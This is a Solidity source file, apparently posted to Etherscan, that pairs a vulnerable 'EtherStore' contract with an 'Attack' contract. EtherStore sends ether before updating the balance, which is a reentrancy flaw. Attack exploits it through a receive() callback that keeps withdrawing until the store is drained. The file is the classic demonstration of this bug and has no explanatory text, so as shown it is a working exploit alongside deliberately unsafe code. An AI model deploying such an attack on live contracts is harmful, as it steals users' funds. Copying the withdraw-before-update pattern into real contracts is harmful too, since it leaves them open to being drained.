/**
 *Submitted for verification at Etherscan.io on 2022-08-26
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "send failed");
        balances[msg.sender] -= amount;
    }
}

contract Attack {
    EtherStore target;

    constructor(address _target) {
        target = EtherStore(_target);
    }

    function deposit() public payable {
        target.deposit{value: msg.value}(); 
    }

    function attack() public {
        target.withdraw(0.1 ether);
    }

    receive() external payable {
        if (address(target).balance > 0.1 ether) {
            target.withdraw(0.1 ether);
        }
    }

}